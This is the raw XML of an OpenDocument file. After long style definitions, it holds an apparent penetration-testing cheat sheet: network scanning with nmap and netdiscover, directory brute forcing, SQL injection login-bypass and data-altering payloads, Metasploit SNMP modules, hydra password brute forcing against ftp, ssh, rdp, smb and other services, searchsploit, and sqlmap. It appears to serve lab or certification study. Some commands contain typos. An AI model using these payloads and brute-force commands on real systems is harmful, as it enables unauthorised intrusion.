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text-properties officeooo:paragraph-rsid="0016cd01"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" loext:contextual-spacing="false"/>
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00128461" officeooo:paragraph-rsid="0016cd01" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0016cd01"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003a074f" officeooo:paragraph-rsid="00101d40"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3a074f" officeooo:paragraph-rsid="0011bf3f"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3a074f" officeooo:paragraph-rsid="00165f25"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15b9f9" officeooo:paragraph-rsid="0015b9f9"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678f09" officeooo:paragraph-rsid="00165f25"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60a50a" officeooo:paragraph-rsid="00165f25"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6231e7" officeooo:paragraph-rsid="00165f25"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638a52" officeooo:paragraph-rsid="00165f25"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64b167" officeooo:paragraph-rsid="00165f25"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normal" officeooo:rsid="00593895" officeooo:paragraph-rsid="0016a353" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005aef2a" officeooo:paragraph-rsid="0016a353" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005f12a2" officeooo:paragraph-rsid="0016a353" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003048f0" officeooo:paragraph-rsid="0016a353" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00128461" officeooo:paragraph-rsid="00128461" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004c8d8f" officeooo:paragraph-rsid="001d91c9" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004c8d8f" officeooo:paragraph-rsid="001d91c9" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001f9ec8" officeooo:paragraph-rsid="001f9ec8" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="003a074f" officeooo:paragraph-rsid="00101d40" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00165f25" officeooo:paragraph-rsid="00165f25" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00593895" officeooo:paragraph-rsid="0016a353" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="005f12a2" officeooo:paragraph-rsid="0016a353" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0016a353" officeooo:paragraph-rsid="0016a353" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00101d40" officeooo:paragraph-rsid="00101d40" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00137350"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0015dd64" officeooo:paragraph-rsid="0015dd64"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0016cd01"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00128461" officeooo:paragraph-rsid="00137350" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0047447b" officeooo:paragraph-rsid="0019c2c4" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0047447b" officeooo:paragraph-rsid="0019c2c4" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0047447b" officeooo:paragraph-rsid="00240c4b" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0024c08d" officeooo:paragraph-rsid="0024c08d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0026569d" officeooo:paragraph-rsid="0026569d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="0029e62c" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="002b405d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="0037e58a" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="0039c014" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="003a6ddc" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="003eb6d7" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="00410d2b" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0030a8c3" officeooo:paragraph-rsid="0030a8c3" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003203f1" officeooo:paragraph-rsid="003203f1" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00323b1c" officeooo:paragraph-rsid="00323b1c" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0026569d" officeooo:paragraph-rsid="0026569d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0024c08d" officeooo:paragraph-rsid="0024c08d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#000000" fo:font-size="14pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001c06ba" officeooo:paragraph-rsid="001c06ba" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00137350"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0018d87f"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0045d602" officeooo:paragraph-rsid="0019c2c4"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0045d602" officeooo:paragraph-rsid="00240c4b"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045d602" officeooo:paragraph-rsid="0019c2c4" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00240c4b" officeooo:paragraph-rsid="00240c4b"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00285078"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false"/>
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00101d40" officeooo:paragraph-rsid="0011bf3f" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e62c" officeooo:paragraph-rsid="0037e58a" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties officeooo:paragraph-rsid="0018d87f"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:text-properties officeooo:paragraph-rsid="0018d87f"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0018d87f"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0018d87f"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="0015b9f9"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00638a52"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="0065e1bb"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="005c1db1"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="0060189e"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="0016a353"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="00185f1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9c014" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003a6ddc" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003d6981" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003eb6d7" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003f00c1" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003f1ac7" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="00410d2b" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0037e58a" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="003a6ddc" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00410d2b" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="0047447b"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties officeooo:rsid="002326af"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="00240c4b"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="0045d602"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="0025adbc"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" officeooo:rsid="0026569d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0026569d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="003203f1"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="00323b1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caning Subnet:</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P56"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">netdiscover -i eth0</text:span></text:span><text:span text:style-name="T1"> — This will help me to get the machines available on our network.</text:span></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P17">NMAP:</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P27">While nmap is running I will open all the IPs on browser and will see whether any web service is running on not, if Yes then I will run gobuster or dirb.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P28">Here -u means target URL and -e means print the full url in your console</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P49"><text:bookmark text:name="7426"/><text:span text:style-name="Strong_20_Emphasis">gobuster -e -u </text:span><text:a xlink:type="simple" xlink:href="http://192.168.0.155/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Strong_20_Emphasis">http://10.10.10.10</text:span></text:a><text:span text:style-name="Strong_20_Emphasis"> -w wordlsit.txt</text:span></text:p>
      <text:p text:style-name="P30"><text:bookmark text:name="f498"/><text:span text:style-name="Strong_20_Emphasis">dirb </text:span><text:a xlink:type="simple" xlink:href="http://192.168.1.224/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Strong_20_Emphasis">http://</text:span></text:a><text:span text:style-name="Strong_20_Emphasis">10.10.10.10 wordlist.txt</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T8">If</text:span> I find any login page I will try SQLi manually</text:p>
      <text:p text:style-name="P1"><text:bookmark text:name="7c80"/>admin' --</text:p>
      <text:p text:style-name="P1">admin' #</text:p>
      <text:p text:style-name="P1">admin'/*</text:p>
      <text:p text:style-name="P1">' or 1=1--</text:p>
      <text:p text:style-name="P1">' or 1=1#</text:p>
      <text:p text:style-name="P1">' or 1=1/*</text:p>
      <text:p text:style-name="P3">') or '1'='1--</text:p>
      <text:p text:style-name="P2"><text:bookmark text:name="7c801"/>') or ('1'='1—</text:p>
      <text:p text:style-name="P4">nmap -sP 192.168.0.0/24</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">nmap 192.168.0.0/24</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">Assume that some unauthorized person has scanned your network and found a few open ports/services. This person could then pass some NSE scripts to <text:span text:style-name="Source_20_Text">Nmap</text:span> and see if these services are vulnerable.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">nmap -Pn -sV --script=vulners <text:span text:style-name="T2">&lt;IP&gt;</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P7">nmap - -script vulns &lt;IP&gt;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">nmap --packet-trace 192.168.0.105</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P22">SNMP:</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">nmap -sU -P 161 10.10.10.10</text:p>
      <text:p text:style-name="P10">nmap -sU -P 161 –<text:span text:style-name="T3">script = snmp – brute 10.10.10.10</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11">msfconsole</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">use auxiliary/scanner/snmp/snmp_login</text:p>
      <text:p text:style-name="P12">show options</text:p>
      <text:p text:style-name="P12">setg RHOST </text:p>
      <text:p text:style-name="P12"><text:soft-page-break/>exploit</text:p>
      <text:p text:style-name="P11">use auxiliary/scanner/snmp/snmp_<text:span text:style-name="T4">enum</text:span></text:p>
      <text:p text:style-name="P8">exploit</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P25">PASSWORDS:</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P50"><text:span text:style-name="Strong_20_Emphasis">Some of the service brute force with hydra:</text:span></text:p>
      <text:list xml:id="list4059729082" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P60"><text:bookmark text:name="029f"/>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; <text:span text:style-name="Emphasis">ftp</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60"><text:bookmark text:name="98d0"/>hydra -L usernames.txt -P pass.txt &lt;IP&gt; <text:span text:style-name="Emphasis">mysql</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60"><text:bookmark text:name="db7a"/>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; <text:span text:style-name="Emphasis">pop3</text:span> -V</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60"><text:bookmark text:name="e29e"/>hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; <text:span text:style-name="Emphasis">rdp</text:span>://&lt;IP&gt;</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60"><text:bookmark text:name="b3a0"/>hydra -P common-snmp-community-strings.txt target.com <text:span text:style-name="Emphasis">snmp</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60"><text:bookmark text:name="d5bf"/>hydra -l Administrator -P words.txt 192.168.1.12 <text:span text:style-name="Emphasis">smb </text:span>-t 1</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P58"><text:bookmark text:name="10de"/>hydra -l root -P passwords.txt &lt;IP&gt; <text:span text:style-name="Emphasis">ssh</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list4267252370" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P61"><text:bookmark text:name="e975"/><text:bookmark text:name="b1dd"/>searchsploit “Linux Kernel”</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P61"><text:bookmark text:name="773b"/>searchsploit -m 7618 — <text:span text:style-name="Strong_20_Emphasis">Paste the exploit in the current directory</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P61"><text:bookmark text:name="6ce3"/>searchsploit -p 7618[.c] — <text:span text:style-name="Strong_20_Emphasis">Show complete path</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59"><text:bookmark text:name="253e"/>searchsploit — nmap file.xml — <text:span text:style-name="Strong_20_Emphasis">Search vulns inside a Nmap XML result</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P50"><text:span text:style-name="Strong_20_Emphasis"/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T7">S</text:span>ql:</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13">‘ <text:span text:style-name="T5">or 1=1--</text:span></text:p>
      <text:p text:style-name="P14">blah’ or 1=1 --</text:p>
      <text:p text:style-name="P14">blah’;insert into login values(‘john’;’apple123’);-- </text:p>
      <text:p text:style-name="P13">querry: blah’; create database mydatbase; –</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">sqlmap:</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">sqlmap -u "http://testasp.vulnweb.com/Default.asp?" --cokie=&lt;"ASPSESSIONIDSCQDRRBQ=DCMJELFBGPHBEFFIGAJPCBIB"&gt; --dbs</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs </text:p>
